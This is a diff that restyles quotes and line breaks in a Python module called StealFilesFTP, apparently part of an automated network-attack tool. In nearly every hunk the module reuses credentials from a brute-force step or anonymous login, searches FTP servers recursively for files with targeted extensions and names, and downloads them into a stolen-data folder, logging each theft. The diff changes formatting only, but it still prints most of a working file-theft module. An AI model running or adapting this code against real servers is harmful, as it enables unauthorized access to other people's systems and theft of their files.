@@ -21,10 +21,12 @@ b_status = "steal_files_ftp"
 b_parent = "FTPBruteforce"
 b_port = 21
 
+
 class StealFilesFTP:
     """
     Class to handle the process of stealing files from FTP servers.
     """
+
     def __init__(self, shared_data):
         try:
             self.shared_data = shared_data
@@ -46,7 +48,9 @@ class StealFilesFTP:
             logger.info(f"Connected to {ip} via FTP with username {username}")
             return ftp
         except Exception as e:
-            logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
+            logger.error(
+                f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}"
+            )
             return None
 
     def find_files(self, ftp, dir_path):
@@ -61,10 +65,15 @@ class StealFilesFTP:
                 try:
                     ftp.cwd(item)
                     files.extend(self.find_files(ftp, os.path.join(dir_path, item)))
-                    ftp.cwd('..')
+                    ftp.cwd("..")
                 except Exception:
-                    if any(item.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
-                       any(file_name in item for file_name in self.shared_data.steal_file_names):
+                    if any(
+                        item.endswith(ext)
+                        for ext in self.shared_data.steal_file_extensions
+                    ) or any(
+                        file_name in item
+                        for file_name in self.shared_data.steal_file_names
+                    ):
                         files.append(os.path.join(dir_path, item))
             logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
         except Exception as e:
@@ -76,11 +85,11 @@ class StealFilesFTP:
         Download a file from the FTP server to the local directory.
         """
         try:
-            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
+            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, "/"))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
-            with open(local_file_path, 'wb') as f:
-                ftp.retrbinary(f'RETR {remote_file}', f.write)
+            with open(local_file_path, "wb") as f:
+                ftp.retrbinary(f"RETR {remote_file}", f.write)
             logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
         except Exception as e:
             logger.error(f"Error downloading file {remote_file} from FTP: {e}")
@@ -90,7 +99,9 @@ class StealFilesFTP:
         Steal files from the FTP server.
         """
         try:
-            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
+            if "success" in row.get(
+                self.b_parent_action, ""
+            ):  # Verify if the parent action is successful
                 self.shared_data.bjornorch_status = "StealFilesFTP"
                 logger.info(f"Stealing files from {ip}:{port}...")
                 # Wait a bit because it's too fast to see the status change
@@ -100,12 +111,14 @@ class StealFilesFTP:
                 ftpfile = self.shared_data.ftpfile
                 credentials = []
                 if os.path.exists(ftpfile):
-                    with open(ftpfile, 'r') as f:
+                    with open(ftpfile, "r") as f:
                         lines = f.readlines()[1:]  # Skip the header
                         for line in lines:
-                            parts = line.strip().split(',')
+                            parts = line.strip().split(",")
                             if parts[1] == ip:
-                                credentials.append((parts[3], parts[4]))  # Username and password
+                                credentials.append(
+                                    (parts[3], parts[4])
+                                )  # Username and password
                     logger.info(f"Found {len(credentials)} credentials for {ip}")
 
                 def try_anonymous_access():
@@ -113,7 +126,7 @@ class StealFilesFTP:
                     Try to access the FTP server without credentials.
                     """
                     try:
-                        ftp = self.connect_ftp(ip, 'anonymous', '')
+                        ftp = self.connect_ftp(ip, "anonymous", "")
                         return ftp
                     except Exception as e:
                         logger.info(f"Anonymous access to {ip} failed: {e}")
@@ -121,14 +134,16 @@ class StealFilesFTP:
 
                 if not credentials and not try_anonymous_access():
                     logger.error(f"No valid credentials found for {ip}. Skipping...")
-                    return 'failed'
+                    return "failed"
 
                 def timeout():
                     """
                     Timeout function to stop the execution if no FTP connection is established.
                     """
                     if not self.ftp_connected:
-                        logger.error(f"No FTP connection established within 4 minutes for {ip}. Marking as failed.")
+                        logger.error(
+                            f"No FTP connection established within 4 minutes for {ip}. Marking as failed."
+                        )
                         self.stop_execution = True
 
                 timer = Timer(240, timeout)  # 4 minutes timeout
@@ -138,9 +153,11 @@ class StealFilesFTP:
                 success = False
                 ftp = try_anonymous_access()
                 if ftp:
-                    remote_files = self.find_files(ftp, '/')
-                    mac = row['MAC Address']
-                    local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/anonymous")
+                    remote_files = self.find_files(ftp, "/")
+                    mac = row["MAC Address"]
+                    local_dir = os.path.join(
+                        self.shared_data.datastolendir, f"ftp/{mac}_{ip}/anonymous"
+                    )
                     if remote_files:
                         for remote_file in remote_files:
                             if self.stop_execution:
@@ -148,7 +165,9 @@ class StealFilesFTP:
                             self.steal_file(ftp, remote_file, local_dir)
                         success = True
                         countfiles = len(remote_files)
-                        logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
+                        logger.success(
+                            f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access"
+                        )
                     ftp.quit()
                     if success:
                         timer.cancel()  # Cancel the timer if the operation is successful
@@ -161,9 +180,12 @@ class StealFilesFTP:
                         logger.info(f"Trying credential {username}:{password} for {ip}")
                         ftp = self.connect_ftp(ip, username, password)
                         if ftp:
-                            remote_files = self.find_files(ftp, '/')
-                            mac = row['MAC Address']
-                            local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/{username}")
+                            remote_files = self.find_files(ftp, "/")
+                            mac = row["MAC Address"]
+                            local_dir = os.path.join(
+                                self.shared_data.datastolendir,
+                                f"ftp/{mac}_{ip}/{username}",
+                            )
                             if remote_files:
                                 for remote_file in remote_files:
                                     if self.stop_execution:
@@ -171,23 +193,28 @@ class StealFilesFTP:
                                     self.steal_file(ftp, remote_file, local_dir)
                                 success = True
                                 countfiles = len(remote_files)
-                                logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'")
+                                logger.info(
+                                    f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'"
+                                )
                             ftp.quit()
                             if success:
                                 timer.cancel()  # Cancel the timer if the operation is successful
                                 break  # Exit the loop as we have found valid credentials
                     except Exception as e:
-                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")
+                        logger.error(
+                            f"Error stealing files from {ip} with user '{username}': {e}"
+                        )
 
                 # Ensure the action is marked as failed if no files were found
                 if not success:
                     logger.error(f"Failed to steal any files from {ip}:{port}")
-                    return 'failed'
+                    return "failed"
                 else:
-                    return 'success'
+                    return "success"
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
-            return 'failed'
+            return "failed"
+
 
 if __name__ == "__main__":
     try:
